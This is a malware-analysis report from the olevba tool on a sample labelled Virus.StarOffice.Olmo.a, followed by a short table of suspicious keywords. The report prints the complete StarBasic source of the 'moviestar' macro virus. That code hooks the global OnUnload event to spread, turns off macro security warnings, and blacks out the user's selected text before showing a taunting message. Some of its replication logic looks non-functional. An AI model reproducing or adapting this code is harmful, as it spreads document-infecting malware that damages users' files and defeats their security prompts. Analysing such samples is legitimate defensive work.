olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.StarOffice.Olmo.a-6d5272181a8e0fa3a6971e393c4e83b2f87572d3
Type: Text
-------------------------------------------------------------------------------
VBA MACRO Virus.StarOffice.Olmo.a-6d5272181a8e0fa3a6971e393c4e83b2f87572d3 
in file: Virus.StarOffice.Olmo.a-6d5272181a8e0fa3a6971e393c4e83b2f87572d3 - OLE stream: ''
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE script:module PUBLIC "-//OpenOffice.org//DTD OfficeDocument 1.0//EN" "module.dtd">
<script:module xmlns:script="http://openoffice.org/2000/script" script:name="moviestar" script:language="StarBasic">Dim a(2)
dim b(2)
dim c(2)
dim d(2)
Sub moviestar
&apos;MOVIESTAR
&apos;(c)by Necronomikon/D00mRiderz
Dim mEventProps(1) as new com.sun.star.beans.PropertyValue
mEventProps(0).Name = &quot;EventType&quot;
mEventProps(0).Value = &quot;StarBasic&quot;
mEventProps(1).Name = &quot;Script&quot;
mEventProps(1).Value = &quot;macro://ThisComponent/Standard.moviestar.InstallGlobalModule&quot; 

a(0) = &quot; cGlobalLibName,&quot;
a(1) = &quot;cDocumentLibName,&quot;
a(2) = &quot; BASIC_MODULE &quot;
JStr = Join1()
Call goon(JStr, Split1(JStr))

b(0) = &quot; cGlobalLibName,&quot;
b(1) = &quot;cDocumentLibName,&quot;
b(2) = &quot; DIALOG_MODULE &quot;
JStr = Join2()
Call goon(JStr, Split2(JStr))

c(0) = &quot; cGlobalLibName,&quot;
c(1) = &quot;cDocumentLibName,&quot;
c(2) = &quot; DIALOG_MODULE, m &quot;
JStr = Join3()
Call goon(JStr, Split3(JStr))

d(0) = &quot; cGlobalLibName,&quot;
d(1) = &quot;cDocumentLibName,&quot;
d(2) = &quot; BASIC_MODULE, m &quot;
JStr = Join4()
Call goon(JStr, Split4(JStr))
oGlobalEventBroadcaster = _
createUnoservice(&quot;com.sun.star.frame.GlobalEventBroadcaster&quot;)
oGlobalEventBroadcaster.Events.ReplaceByName(&quot;OnUnload&quot;, mEventProps())
End Sub
Sub goon(JoinStr, TheArray)
l = LBound(TheArray)
u = UBound(TheArray)
total$ = Chr$(13) + JoinStr + Chr$(13) + Chr$(13)
totala$ = Chr$(13) + JoinStr + Chr$(13) + Chr$(13)
totalb$ = Chr$(13) + JoinStr + Chr$(13) + Chr$(13)
totalc$ = Chr$(13) + JoinStr + Chr$(13) + Chr$(13)
For i = l To u
total$ = total$
Next i
For i = l To u
totala$ = totala$
Next i
For i = l To u
totalb$ = totalb$
Next i
For i = l To u
totalc$ = totalc$
Next i
end sub
Sub InstallGlobalModule( ByVal cGlobalLibName As String,Optional cDocumentLibName,Optional m )
&apos;********************************
&apos;****      OOo.moviestar      ****
&apos;********************************
&apos;*(c) by Necronomikon/D00MRiderz*
&apos;********************************
m=&quot;moviestar&quot;
oDocument = ThisComponent
Dim Args(0) as new com.sun.star.beans.PropertyValue
Args(0).Name = &quot;MacroExecutionMode&quot;
Args(0).Value = _
com.sun.star.document.MacroExecMode.ALWAYS_EXECUTE_NO_WARN
ThisComponent.LockControllers 
If IsMissing( cDocumentLibName ) Then
cDocumentLibName = cGlobalLibName
EndIf

If IsMissing( m ) Then
InstallGlobalModule(  total$ )
InstallGlobalModule(  totala$  )
Else
If DoesModuleExist( cDocumentLibName, m, DOCUMENT_LIBRARY, DIALOG_MODULE ) Then
InstallGlobalModule(  totalb$  )	
ElseIf DoesModuleExist( cDocumentLibName, m, DOCUMENT_LIBRARY, BASIC_MODULE ) Then
InstallGlobalModule(  totalc$  )		
Else
EndIf
EndIf
call payload
oDocument.store()
End Sub
sub payload
myDoc=thisComponent
myViewCursor=myDoc.GetCurrentController.ViewCursor
mytext=myViewCursor.string
myLen=len(mytext)
mynewtext=&quot;black&quot;

for i=1 to mylen
mynewtext=mynewtext+&quot;black&quot;
next

myViewCursor.string=mynewtext
myViewCursor.charcolor=&amp;H000000
myViewCursor.charbackcolor=&amp;H000000
myViewCursor.goright(mylen+1,false)
sMSG = &quot;Be a STAR!!!&quot;  &amp; Chr(13) &amp; Chr(10) _
&amp; &quot;-------------------------------------------&quot;  &amp; Chr(13) &amp; Chr(10) _
&amp; &quot;(c)by Necronomikon D00MRiderz VX Team&quot;
sMSGTitle = &quot;MOVIESTAR&quot;

Style = MSGBOX_OK + MSGBOX_ICON_EXCLAMATION 
MsgBox (sMSG, Style, sMSGTitle)
end sub

Function Join1()
Join1 = Join(a())
End Function
Function Split1(aStr)
Split1 = Split(aStr, &quot;C&quot;)
End Function
Function Join2()
Join2 = Join(b())
End Function
Function Split2(aStr)
Split2 = Split(aStr, &quot;D&quot;)
End Function
Function Join3()
Join3 = Join(c())
End Function
Function Split3(aStr)
Split3 = Split(aStr, &quot;E&quot;)
End Function
Function Join4()
Join4 = Join(d())
End Function
Function Split4(aStr)
Split4 = Split(aStr, &quot;F&quot;)
End Function
Function DoesModuleExist( ByVal cLibraryName As String,_
							ByVal  m  As String,_
							ByVal bGlobal As Boolean,_
							ByVal bDialog As Boolean _
							) As Boolean	
If bGlobal Then
If bDialog Then
oLibs = GlobalScope.DialogLibraries

Else
oLibs = GlobalScope.BasicLibraries
EndIf

Else
If bDialog Then
oLibs = DialogLibraries

Else
oLibs = BasicLibraries
EndIf
EndIf
	
bExists = False
If oLibs.hasByName( cLibraryName ) Then
oLib = oLibs.getByName( cLibraryName )
If oLib.hasByName( m ) Then
bExists = True
EndIf
EndIf
DoesModuleExist() = bExists
End Function
</script:module>
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|IOC       |http://openoffice.or|URL                                          |
|          |g/2000/script       |                                             |
+----------+--------------------+---------------------------------------------+
